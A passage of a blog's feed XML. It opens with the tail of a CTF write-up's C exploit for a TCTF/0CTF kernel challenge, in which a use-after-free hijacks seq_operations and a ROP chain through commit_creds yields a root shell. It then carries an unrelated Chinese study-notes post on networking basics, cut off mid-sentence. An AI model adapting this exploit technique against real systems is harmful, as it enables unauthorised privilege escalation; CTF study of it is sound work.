class="number">8</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (kernel_base)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        search_addr += <span class="number">0x8000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>; <span class="comment">// don&#x27;t forget to set it in main process</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// hijack seq_operations-&gt;start</span></span><br><span class="line">    chunkAdd(<span class="number">1</span>);</span><br><span class="line">    chunkSet(<span class="number">1</span>);</span><br><span class="line">    chunkDel(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    chunkEdit(<span class="number">0xffffffff817c21a6</span> + kernel_offset); <span class="comment">// add rsp, 0x198 ; pop r12 ; pop rbp ; ret</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hijack to: %p\n&quot;</span>, <span class="number">0xffffffff817c21a6</span> + kernel_offset);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret = POP_RDI_RET + kernel_offset;</span><br><span class="line">    init_cred = INIT_CRED + kernel_offset;</span><br><span class="line">    commit_creds = COMMIT_CREDS + kernel_offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13,   pop_rdi_ret;&quot;</span> <span class="comment">// start at there</span></span><br><span class="line">        <span class="string">&quot;mov r12,   init_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    0x88888888;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   seq_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可完成<strong>稳定化提权</strong></p><p><img src="https://s2.loli.net/2022/01/05/YjJTbIsMGUaZ2Xu.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;欧皇与非酋的对决&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="信息安全" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/tags/CTF/"/>
    
    <category term="Use After Free" scheme="http://blog.arttnba3.cn/tags/Use-After-Free/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="TCTF/0CTF" scheme="http://blog.arttnba3.cn/tags/TCTF-0CTF/"/>
    
    <category term="Kernel BROP" scheme="http://blog.arttnba3.cn/tags/Kernel-BROP/"/>
    
    <category term="Kernel UAF" scheme="http://blog.arttnba3.cn/tags/Kernel-UAF/"/>
    
  </entry>
  
  <entry>
    <title>【NETWORK.0x00】计算机网络原理学习笔记</title>
    <link href="http://blog.arttnba3.cn/2021/09/27/NETWORK-0X00-COMPUTER_NETWORK_BASIS/"/>
    <id>http://blog.arttnba3.cn/2021/09/27/NETWORK-0X00-COMPUTER_NETWORK_BASIS/</id>
    <published>2021-09-26T16:27:43.000Z</published>
    <updated>2022-08-18T17:48:07.869Z</updated>
    
    <content type="html"><![CDATA[<p>我爱计网计网爱我</p><span id="more"></span><blockquote><p><del>我像计网爱我那样爱计网</del>（🔫</p></blockquote><h1 id="0x00-写在开始之前"><a href="#0x00-写在开始之前" class="headerlink" title="0x00.写在开始之前"></a>0x00.写在开始之前</h1><p>计算机网络原理一直都是计算机科学与技术中十分基础与重要的的课程，刚好这学期开了计算机网络这门课，<del>为了避免挂科还是</del>学到一点写一点，不过本篇博文<strong>并非考试导向性质的笔记，只会记录笔者认为重要的内容，不会特意标注所谓重点</strong>（<del>什么·？你想拿来考研？</del></p><p>主要参照《数据通信与网络》与老师上课用的 PPT，配合着笔者个人的一些理解，笔者认为不重要的会标注 <code>*</code>，如有错误还请大家不吝赐教</p><p>当前进度：Chapter.06   2022.1.5（如果看到笔者还没更新完请提醒笔者（笑））</p><blockquote><p>简单看了一下这本书主要以自底向上的方式混合叙述了 TCP&#x2F;IP 四层模型与 OSI 七层模型的内容：物理层、数据链路层（前面这两层在 TCP&#x2F;IP 中合为网络访问层）、网络层、传输层、应用层（在 OSI 七层模型中应用层被分为三层，自底向上为：会话层、表示层、应用层）</p></blockquote><blockquote><p>附上两张从网上找到的图</p><p><img src="https://i.loli.net/2021/09/28/AGyOHXZINmP7R4C.png"></p><p><img src="https://i.loli.net/2021/09/28/FRj2ZYOiT1Ah8wo.png"></p></blockquote><h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01.概述"></a>0x01.概述</h1><h2 id="Chapter-1-绪论"><a href="#Chapter-1-绪论" class="headerlink" title="Chapter 1 - 绪论"></a>Chapter 1 - 绪论</h2><h3 id="1-1-数据通信"><a href="#1-1-数据通信" class="headerlink" title="1.1 数据通信"></a>1.1 数据通信</h3><p><strong>数据通信</strong>（data communication）即在两台设备间进行数据交换，其效率主要取决于以下四个因素：</p><ul><li><strong>传递性</strong>：系统必须将数据传递到正确的目的地</li><li><strong>准确性</strong>：系统必须准确地传输数据</li><li><strong>及时性</strong>：系统必须以及时的方式传递数据</li><li><strong>抖动性</strong>：分组到达时间的变化率应当要低</li></ul><p>一个数据通信系统主要有如下图所示的五个组成部分：</p><p><img src="https://i.loli.net/2021/09/28/KhQv3z84rsBbkWD.png" alt="image.png"></p><ul><li><strong>报文</strong>（message）：即用以进行通信的数据</li><li><strong>发送方</strong>（sender）：发送报文的设备</li><li><strong>接收方</strong>（receiver）：接收报文的设备</li><li><strong>传输介质</strong>（transmission medium）：报文从发送方到接收方所经过的物理通路</li><li><strong>协议</strong>（protocol）：用以管理数据通信的一组规则，表示通信设备之间如何进行通信的约定</li></ul><p>两台设备之间的<strong>通信模式</strong>主要有以下三种：</p><p><img src="https://i.loli.net/2021/09/27/yaMkHe24ctFIYob.png" alt="image.png"></p><ul><li><strong>单工</strong>（simplex mode）：两台设备间的通信是单向的，一方只能为接收方而另一方只能为发送方</li><li>(全)<strong>双工</strong>（(full-)duplex mode）：两台设备间的通信是双向的，<strong>通信双方都可以同时收发报文</strong></li><li><strong>半双工</strong>（half-duplex mode）：两台设备间的通信是双向的，但是<strong>在同一时刻报文的传输只能是单向的</strong></li></ul><h3 id="1-2-网络"><a href="#1-2-网络" class="headerlink" title="1.2 网络"></a>1.2 网络</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p><strong>网络</strong>（network）即为用通信链路连接起来的<strong>设备</strong>（称之为节点）<strong>的集合</strong></p><blockquote><p><strong>分布式处理</strong>（distributed processing）为一种典型的网络模式：将一个任务分给多个节点处理</p></blockquote><p>我们主要从以下三个方面评估一个网络：</p><ul><li><strong>性能</strong>（performance）：主要由以下两个因素进行度量：<ul><li><strong>吞吐量</strong>（throughput）：【相当一段时间】内收发的总数据量</li><li><strong>延迟</strong>（delay&#x2F;latency）：请求响应【出入系统的时间】</li></ul></li></ul><p>吞吐量大延迟不一定低，反之亦然，因为吞吐量描述的是整个系统的性能，而延迟描述的是系统对于用户的响应时间</p><blockquote><p>例如一个系统可以一次吞吐 114514 TB数据，但一次只能处理233个用户的请求，此时一次性来了1919810个用户，延迟就爆炸了</p></blockquote><ul><li><strong>可靠性</strong>（reliability）：即网络是否可靠，主要由故障出现的频率、出错的恢复时间、抗灾性能三个方面来衡量</li><li><strong>安全性</strong>（security）：网络是否能够保护数据在传输过程中不被窃取与破解、数据丢失后是否有较好的恢复策略</li></ul><h4 id="连接类型"><a href="#连接类型" class="headerlink" title="连接类型"></a>连接类型</h4><p>网络的<strong>连接类型</strong>主要有以下两种：</p><p><img src="https://i.loli.net/2021/09/28/nH1qta5ml4vTFzY.png" alt="image.png"></p><ul><li><strong>点到点</strong>（point-to-point）：两台设备之间使用一条专用链路进行通信</li><li><strong>多点连接</strong>（multipoint connection）：在一条通信链路上有着多台设备</li></ul><h4 id="拓扑结构"><a href="#拓扑结构" class="headerlink" title="拓扑结构"></a>拓扑结构</h4><p><strong>物理拓扑结构</strong>（physical topology）指的是网络在物理上分布的方式，一条链路上连接着两台或多台设备，两条或多条链路组成拓扑结构，主要有以下几种：</p><ul><li><p><strong>网状</strong>：网络中的数个节点之间互相<strong>自由连接</strong>，形成一张网</p></li><li><p><strong>星型</strong>：网络中的数个节点拥有一条与中央节点连接的链路，这个中央节点通常是一个集线器（sub）</p></li><li><p><strong>总线型</strong>：由一条较长的线缆作为<strong>主干</strong>（backbone）来连接网络上的所有设备</p></li><li><p><strong>环状</strong>：每台设备只与其两侧的设备有一条专用的点到点连接，环中的每个设备中安装有一个中继器</p><blockquote><p>笔者认为环状可以理解为总线型首尾相连，每个设备多出一个中继器</p></blockquote></li><li><p><strong>混合型</strong>：由上述拓扑结构中的两种及以上构成的网络</p></li></ul><h4 id="规模分类"><a href="#规模分类" class="headerlink" title="规模分类"></a>规模分类</h4><p><strong>根据网络的规模</strong>，我们将网络分为以下两种类型：</p><ul><li><strong>局域网</strong>（local area network，简称 LAN）：由一定范围内的少量设备组成的网络，通常是私有网络</li><li><strong>广域网</strong>（wide area network，简称 WAN）：大范围内的数个局域网与设备组成的网络</li></ul><p><strong>互联网络</strong>（internet）便是由多个网络彼此连接组成的网络，最著名的互联网便是因特网（Internet）</p><blockquote><p> 还有一种介于广域网与局域网间的概念叫城域网，不过在笔者看来似乎并不常用</p></blockquote><h3 id="1-3-协议"><a href="#1-3-协议" class="headerlink" title="1.3 协议"></a>1.3 协议</h3><p><strong>协议</strong>（protocol）即为用来管理数据通讯的一组规则，其定义了通信的内容、通信的方式与通信的时间。协议的核心要素为：</p><ul><li><strong>语法</strong>（syntax）：数据的结构或格式</li></ul><blockquote><p>比如说协议A定义了数据格式为 header + data，定义了 header 中的按 8 字节分组为 header size、sender address、receiver address、data length…等等</p></blockquote><ul><li><strong>语义</strong>（semantics）：每一个位片段的含义</li></ul><blockquote><p>例如协议 A 中的 sender address 的前两位标识了路由…等等</p></blockquote><ul><li><strong>时序</strong>（timing）：报文的发送时间与发送速率</li></ul><h2 id="Chapter-2-网络模型"><a href="#Chapter-2-网络模型" class="headerlink" title="Chapter 2 - 网络模型"></a>Chapter 2 - 网络模型</h2><p>目前主要有两种网络<strong>分层</strong>模型：<code>OSI七层模型</code>（Open System Interconnection，开放式系统互联）与 <code>TCP/IP 模型</code>，其对应关系如下图所示：</p><p><img src="https://i.loli.net/2021/09/28/1ujnpTi6efUPwEX.png" alt="image.png"></p><p>信息在发送时通过各层提供的接口由高层向低层传递，逐层封装，接收方再逐层进行解封，如下图所示：</p><p><img src="https://i.loli.net/2021/10/08/r3Zoi6bufOAyNep.png" alt="image.png"></p><h3 id="2-1-OSI-Model"><a href="#2-1-OSI-Model" class="headerlink" title="2.1 OSI Model"></a>2.1 OSI Model</h3><p>由 ISO 定义的一个网络模型，结构如下图所示：</p><blockquote><p>这张图也是从网上偷的</p></blockquote><p><img src="https://i.loli.net/2021/10/09/OIbesTYf79y3pDw.png" alt="image.png"></p><h4 id="物理层（physical-layer）"><a href="#物理层（physical-layer）" class="headerlink" title="物理层（physical layer）"></a>物理层（physical layer）</h4><p>定义了接口与传输介质的物理属性，以及物理设备和接口为了传输而必须执行的过程和功能，其主要关注如下问题：</p><ul><li><strong>接口与介质的物理特性</strong></li><li><strong>位的表示</strong>（编码类型，即如何将0&#x2F;1转换为信号）</li><li><strong>数据速率</strong>（每秒发送的位数）</li><li><strong>位同步</strong>（收发双方时钟同步）</li><li><strong>线路配置</strong></li><li><strong>物理拓扑结构</strong></li><li><strong>传输方式</strong></li></ul><h4 id="数据链路层（data-link-layer）"><a href="#数据链路层（data-link-layer）" class="headerlink" title="数据链路层（data link layer）"></a>数据链路层（data link layer）</h4><p>该层负责<strong>帧</strong>（<strong>frame</strong>）<strong>从一个节点</strong>（<strong>node</strong>）<strong>到下一个节点的传输</strong>，职能如下：</p><ul><li><strong>分帧</strong>：将从网络层接收到的数据流划分为称为<strong>帧</strong>（<strong>frame</strong>）的单元</li><li><strong>物理寻址</strong>：数据链路层会在 frame header 中记录<strong>发送方与接收方的物理地址</strong>（主要是 mac 地址），若目标设备处在发送设备所处网络内，则 frame header 中记录的接收方地址为目标设备地址，否则为下一个节点的地址</li></ul><blockquote><p>由此我们可以看出：若是在同一个二层网络中有两台 mac 相同的设备，则这两台设备将完全不能进行通信：上层交换机可能弄混这两台设备导致发错包</p></blockquote><ul><li><strong>流量控制</strong>：主要是调控发送方的速率，防止接收方过载</li><li><strong>差错控制</strong>：检测与重发损坏或丢失的帧，去除重复帧，保证数据可靠性</li><li><strong>访问控制</strong>：决定多台设备并发访问同一条链路的访问顺序</li></ul><h4 id="网络层（network-layer）"><a href="#网络层（network-layer）" class="headerlink" title="网络层（network layer）"></a>网络层（network layer）</h4><p>该层负责将各个分组从源地址传递到目标地址（主要是针对不同链路中的设备，对于同一链路上的设备间的通信则可以不需要网络层的经手），主要任务为：</p><ul><li><strong>逻辑寻址</strong>：网络层会在 data header 中记录<strong>发送方与接收方的逻辑地址</strong>（最常用的为 IP 地址）</li><li><strong>路由选择</strong>：在多个链路构成的互联网中通过连接设备（路由器&#x2F;网关）将分组送至其最终目的地</li></ul><h4 id="传输层（transport-layer）"><a href="#传输层（transport-layer）" class="headerlink" title="传输层（transport layer）"></a>传输层（transport layer）</h4><p>该层负责报文的<strong>进程到进程传递</strong>（<strong>process-to-process delivery</strong>），即将报文送到相应的端口，传递给对应的进程，具体任务如下：</p><ul><li><strong>服务点寻址</strong>：在传输层的 header 中记录了进程对应的_服务点地址_（端口地址），由此将报文传送给指定进程</li><li><strong>分段和组装</strong>：将报文分解为可传输片段并标号以保证数据可靠性</li><li><strong>连接控制</strong>：传输层可以是无连接的（例如 UDP）也可以是面向连接的（例如 TCP），前者直接进行报文的传输，后者在此之前还需要进行连接的建立（例如经典的 TCP 三次握手）</li><li><strong>流量控制</strong>：主要是调控发送方的速率，防止接收方过载，与数据链路层不同的是这一层的流量控制在_端到端_上（两个通信的进程之间）</li><li><strong>差错控制</strong>：检测与重发损坏或丢失的片段，去除重复片段，保证数据可靠性</li></ul><blockquote><p>至此，数据在网络间的传输过程已经结束，接下来的三层在笔者看来<strong>与实际应用程序相关联，并不与计算机网络原理具有强关联</strong>，故不会详细叙述</p><h4 id="会话层（session-layer）"><a href="#会话层（session-layer）" class="headerlink" title="*会话层（session layer）"></a><em>*会话层（session layer）</em></h4><p>该层主要负责对话控制与同步</p><h4 id="表示层（presentation-layer）"><a href="#表示层（presentation-layer）" class="headerlink" title="*表示层（presentation layer）"></a><em>*表示层（presentation layer）</em></h4><p>该层主要负责翻译、加密与压缩数据</p><h4 id="应用层（application-layer）"><a href="#应用层（application-layer）" class="headerlink" title="*应用层（application layer）"></a><em>*应用层（application layer）</em></h4><p>该层主要负责向用户提供服务</p></blockquote><h3 id="2-2-TCP-x2F-IP-协议族"><a href="#2-2-TCP-x2F-IP-协议族" class="headerlink" title="2.2 TCP&#x2F;IP 协议族"></a>2.2 TCP&#x2F;IP 协议族</h3><p>TCP&#x2F;IP 协议族与 OSI 七层模型<strong>并非严格对应</strong>，但大致上存在如本章头图所示的对应关系</p><h4 id="网络访问层（network-access）"><a href="#网络访问层（network-access）" class="headerlink" title="网络访问层（network access）"></a>网络访问层（network access）</h4><p>相当于 OSI Model 中的 <code>物理层 + 数据链路层</code>，在这一层中支持所有的标准与专门协议</p><blockquote><p>也有人称为 “一个大的物理层”</p></blockquote><h4 id="互联网层（internet）"><a href="#互联网层（internet）" class="headerlink" title="互联网层（internet）"></a>互联网层（internet）</h4><p>相当于 OSI Model 中的 <code>网络层</code>，在这一层中使用<strong>网际协议</strong>（<strong>Internetworking Protocol， 即 IP</strong>）</p><p>网际协议为 TCP&#x2F;IP 协议使用的传输机制，其支持四个子协议：</p><ul><li><strong>地址解析协议</strong>（<strong>Address Resolution Protocol，即 ARP</strong>）：通过逻辑地址获得对应物理地址（例如由 IP 地址寻找对应 mac 地址）</li><li><strong>逆地址解析协议</strong>（<strong>Reverse Address Resolution Protocol，即 RARP</strong>）：设备第一次接入网络时向网关请求逻辑地址</li><li><strong>因特网控制报文协议</strong>（<strong>Internet Control Message Protocol，即 ICMP</strong>）：用于在 IP 主机与路由之间传递控制消息（网络是否连通、主机是否可达、路由是否可用等）</li><li><strong>因特网控制报文协议</strong>（<strong>Internet Group Message Protocol，即 IGMP</strong>）：用于主机与本地路由器之间进行组播组成员信息的交互（决定分组信息与组播报文的传递）</li></ul><h4 id="传输层（transport）"><a href="#传输层（transport）" class="headerlink" title="传输层（transport）"></a>传输层（transport）</h4><p>相当于 OSI Model 中的 <code>传输层</code>，负责报文的进程间传递，主要支持如下协议：</p><ul><li><strong>用户数据报协议</strong>（<strong>User Datagram Protocol， 即 UDP</strong>）：无连接的传输</li><li><strong>传输控制协议</strong>（<strong>Transmission Control Protocol，即 TCP</strong>）：面向连接的传输</li><li>流控制传输协议（Stream Control Transmission Protocol，即 SCTP）</li></ul><h4 id="应用层（application）"><a href="#应用层（application）" class="headerlink" title="应用层（application）"></a>应用层（application）</h4><p>相当于 OSI Model 中的 <code>会话层 + 表示层 + 应用层</code>，常见的 <code>http/ftp/telnet/ssh/snmp/smb</code> 等都在这一层</p><p>综上，我们可以将 TCP&#x2F;IP 模型化为较为通用的<strong>五层</strong>层次结构，如下图所示：</p><p><img src="https://i.loli.net/2021/10/09/tiopV6dEJwjSYmu.png" alt="image.png"></p><h3 id="2-3-寻址"><a href="#2-3-寻址" class="headerlink" title="2.3 寻址"></a>2.3 寻址</h3><p>对于采用了 TCP&#x2F;IP 协议的互联网而言其使用四层地址结构：</p><h4 id="物理（链路）地址（physical-（link）-address）："><a href="#物理（链路）地址（physical-（link）-address）：" class="headerlink" title="物理（链路）地址（physical （link） address）："></a><strong>物理</strong>（<strong>链路</strong>）<strong>地址</strong>（<strong>physical</strong> （<strong>link</strong>） <strong>address</strong>）：</h4><p>对应 TCP&#x2F;IP 四层模型中的网络访问层（物理层），主要在网络（LAN&#x2F;WAN）中使用，<strong>不同网络中的物理地址格式可能不同</strong></p><h4 id="逻辑（IP）地址（logical-（IP）-address）"><a href="#逻辑（IP）地址（logical-（IP）-address）" class="headerlink" title="逻辑（IP）地址（logical （IP） address）"></a><strong>逻辑</strong>（<strong>IP</strong>）<strong>地址</strong>（<strong>logical</strong> （<strong>IP</strong>） <strong>address</strong>）</h4><p>对应 TCP&#x2F;IP 四层模型中的互联网层，与物理地址无关，作为互联网环境中一台设备的<strong>唯一标记</strong>，在一个互联网中<strong>没有两台主机具有相同的 IP 地址</strong></p><blockquote><p>由此我们可以看出，在数据在节点到节点的传输过程中<strong>物理地址会发生改变，但逻辑地址并不会</strong></p></blockquote><h4 id="端口地址（port-addr）"><a href="#端口地址（port-addr）" class="headerlink" title="端口地址（port addr）"></a><strong>端口地址</strong>（<strong>port addr</strong>）</h4><p>对应 TCP&#x2F;IP 四层模型中的传输层，为赋予对应通信进程的标识符，其长度为 16 位</p><h4 id="专用地址（private-address）"><a href="#专用地址（private-address）" class="headerlink" title="*专用地址（private address）"></a>*专用地址（private address）</h4><p>对应 TCP&#x2F;IP 四层模型中的应用层，部分面向用户的应用被设计为专用地址（例如邮件地址、URL等）</p><h1 id="00x02-物理层和介质"><a href="#00x02-物理层和介质" class="headerlink" title="00x02.物理层和介质"></a>00x02.物理层和介质</h1><blockquote><p>笔者最讨厌的物理部分（笑）</p><p>一些基本概念这里就不再手抄一遍了，不懂的自己百度（）</p></blockquote><h2 id="Chapter-3-数据和信号"><a href="#Chapter-3-数据和信号" class="headerlink" title="Chapter 3 - 数据和信号"></a>Chapter 3 - 数据和信号</h2><p>数据若要进行传输，则必须要将其转为电磁信号的形式</p><h3 id="3-1-周期模拟信号"><a href="#3-1-周期模拟信号" class="headerlink" title="3.1 周期模拟信号"></a>3.1 周期模拟信号</h3><p>最简单的周期模拟信号为<strong>正弦波</strong>，由多个正弦波组成的信号为复合型模拟信号，我们使用<strong>复合信号</strong>（composite signal）来进行数据通信</p><h4 id="带宽（bandwidth）"><a href="#带宽（bandwidth）" class="headerlink" title="带宽（bandwidth）"></a>带宽（bandwidth）</h4><p><strong>复合信号包含的频率范围称为带宽</strong>，即带宽通常为信号最高频率与最低频率的差值</p><h3 id="3-2-数字信号"><a href="#3-2-数字信号" class="headerlink" title="3.2 数字信号"></a>3.2 数字信号</h3><blockquote><p>“《数字信号处理》，一章没看”</p></blockquote><p>我们可以使用数字信号表示数据——<strong>将不同的数据编码为不同的电平</strong>，例如将 1 编码为正电平而 0 编码为 0 电平。一般来说，对于 L 个不同的电平而言，每个电平可以表示 log<sub>2</sub>L 个位</p><p>基于_傅里叶分析_，我们可以得出：数字信号为<strong>带宽无限大的复合模拟信号</strong>。</p><h4 id="比特率（bit-rate）"><a href="#比特率（bit-rate）" class="headerlink" title="比特率（bit rate）"></a>比特率（bit rate）</h4><p>比特率即为<strong>一秒中所发送的位数</strong>，单位为<strong>位每秒</strong>（<strong>bits per second，即 bps</strong>）</p><h4 id="位长（bit-length）"><a href="#位长（bit-length）" class="headerlink" title="位长（bit length）"></a>位长（bit length）</h4><p>位长即为<strong>一个位在传输介质上的距离</strong>，有如下公式：</p><p>$$<br>位长 &#x3D; 传播速度 × 位持续时间<br>$$</p><h4 id="数字信号的传输"><a href="#数字信号的传输" class="headerlink" title="数字信号的传输"></a>数字信号的传输</h4><h5 id="基带传输"><a href="#基带传输" class="headerlink" title="基带传输"></a>基带传输</h5><p>即通过通道直接发送数字信号，而非转为模拟信号，<strong>需要一个带宽下限频率为 0 的低通通道</strong></p><h5 id="宽带传输（使用调制）"><a href="#宽带传输（使用调制）" class="headerlink" title="宽带传输（使用调制）"></a>宽带传输（使用调制）</h5><p>即将数字信号<strong>转换成模拟信号传输</strong>，调制允许我们使用<strong>带通通道</strong></p><h3 id="3-3-传输减损"><a href="#3-3-传输减损" class="headerlink" title="3.3 传输减损"></a>3.3 传输减损</h3><h4 id="衰减（attenuation）"><a href="#衰减（attenuation）" class="headerlink" title="衰减（attenuation）"></a>衰减（attenuation）</h4><p>即信号强度衰减，这意味着能量的损失，为了补偿衰减的能量通常会用放大器放大信号。</p><p><img src="https://i.loli.net/2021/10/11/To8UcnqVvRC2dlK.png" alt="image.png"></p><h5 id="分贝（decibel，-DB）"><a href="#分贝（decibel，-DB）" class="headerlink" title="分贝（decibel， DB）"></a>分贝（decibel， DB）</h5><p>分贝用于描述信号损失&#x2F;增益的强度：<strong>若信号衰减了，则分贝为负值；若信号被放大了，则分贝为正值</strong></p><p>设 P<sub>1</sub> 与 P <sub>2</sub> 为信号在位置 1、2 处的功率，则分贝为：<br>$$<br>dB &#x3D; 10 log_{10}\frac{P_2}{P_1}<br>$$</p><h4 id="失真（distortion）"><a href="#失真（distortion）" class="headerlink" title="失真（distortion）"></a>失真（distortion）</h4><p>即信号的形状或形态发生了改变</p><p><img src="https://i.loli.net/2021/10/11/Dl49Asgq7dZj3GH.png" alt="image.png"></p><h4 id="噪声（noise）"><a href="#噪声（noise）" class="headerlink" title="噪声（noise）"></a>噪声（noise）</h4><p>噪声即为由各种环境因素<strong>附加在原始信号上的额外的垃圾信号</strong></p><p><img src="https://i.loli.net/2021/10/11/MqDXOFIm6rgdh1s.png" alt="image.png"></p><h5 id="信噪比（signal-to-noise-ratio，SNR）"><a href="#信噪比（signal-to-noise-ratio，SNR）" class="headerlink" title="信噪比（signal-to-noise ratio，SNR）"></a>信噪比（signal-to-noise ratio，SNR）</h5><p>信噪比用以描述信号被噪声破坏的程度，计算公式如下：<br>$$<br>SNR&#x3D;\frac{平均信号功率}{平均噪声功率}<br>$$<br>容易看出，SNR 越高，信号被破坏的越少，反之亦然</p><h3 id="3-4-数据速率限制"><a href="#3-4-数据速率限制" class="headerlink" title="3.4 数据速率限制"></a>3.4 数据速率限制</h3><p>数据速率即<strong>每秒传输的比特数</strong>，即<strong>比特率</strong>，通常取决于以下三个因素：</p><ul><li>有效带宽</li><li>使用的信号电平数</li><li>通道的质量（噪声电平）</li></ul><h4 id="无噪声通道：奈奎斯特比特率"><a href="#无噪声通道：奈奎斯特比特率" class="headerlink" title="无噪声通道：奈奎斯特比特率"></a>无噪声通道：奈奎斯特比特率</h4><p>对于无噪声的理想通道，<strong>奈奎斯特比特率</strong>（<strong>Nyquist bit rate</strong>）公式定义了理论上的<strong>最大</strong>比特率：<br>$$<br>比特率 &#x3D; 2 × 带宽 × log_2L<br>$$<br>其中 <code>L</code> 为使用的信号电平数量，需要注意的是 L 的增加会减弱系统的可靠性</p><h4 id="噪声通道：香农容量定理"><a href="#噪声通道：香农容量定理" class="headerlink" title="噪声通道：香农容量定理"></a>噪声通道：香农容量定理</h4><p>对于有噪声的通道，其理论上<strong>最大</strong>比特率为：<br>$$<br>通道容量 &#x3D; 通道带宽 × log_2(1 + SNR)<br>$$<br>该公式定义了通道的特性而非传输方式，<strong>其速率与使用的信号电平数量无关</strong></p><h3 id="3-5-性能"><a href="#3-5-性能" class="headerlink" title="3.5 性能"></a>3.5 性能</h3><p>我们通过以下几个方面衡量网络的性能</p><h4 id="带宽"><a href="#带宽" class="headerlink" title="带宽"></a>带宽</h4><p>链路速度的潜在衡量值，主要有两种衡量方式：以赫兹衡量&#x2F;以每秒比特数衡量</p><h4 id="吞吐量"><a href="#吞吐量" class="headerlink" title="吞吐量"></a>吞吐量</h4><p>即单位时间内成功传输的数据量，是链路速度的实际衡量值</p><h4 id="延迟"><a href="#延迟" class="headerlink" title="延迟"></a>延迟</h4><p>延迟定义了第一个位从源开始发出到整个报文完全到达目标所经历的时间，由以下四个部分组成</p><h5 id="传播时间（propagation-time）"><a href="#传播时间（propagation-time）" class="headerlink" title="传播时间（propagation time）"></a>传播时间（propagation time）</h5><p>即一个位从源传输到目标所需的时间，通过<code>距离➗传播速度</code>计算而得</p><h5 id="传输时间（transmission-time）"><a href="#传输时间（transmission-time）" class="headerlink" title="传输时间（transmission time）"></a>传输时间（transmission time）</h5><p>即传输一个报文所需的时间，计算公式为<code>报文长度➗带宽</code></p><h5 id="排队时间（queuing-time）"><a href="#排队时间（queuing-time）" class="headerlink" title="排队时间（queuing time）"></a>排队时间（queuing time）</h5><p>每个中间或端设备在处理报文前保持报文所需的时间</p><h5 id="处理延迟（processing-delay）"><a href="#处理延迟（processing-delay）" class="headerlink" title="处理延迟（processing delay）"></a>处理延迟（processing delay）</h5><p>接收者处理报文所需时间</p><h2 id="Chapter-4-数字传输"><a href="#Chapter-4-数字传输" class="headerlink" title="Chapter 4 - 数字传输"></a>Chapter 4 - 数字传输</h2><h3 id="4-1-数字到数字转换"><a href="#4-1-数字到数字转换" class="headerlink" title="4.1 数字到数字转换"></a>4.1 数字到数字转换</h3><h4 id="线路编码（line-coding）"><a href="#线路编码（line-coding）" class="headerlink" title="线路编码（line coding）"></a>线路编码（line coding）</h4><p>线路编码即为将数字数据转换为数字信号的过程（0110…转换为高低电平），首先明确如下两个概念：</p><ul><li><p><strong>数据元素</strong>（data element）：数据元素为表示一块信息的最小实体，即<strong>位</strong></p></li><li><p><strong>信号元素</strong>（signal 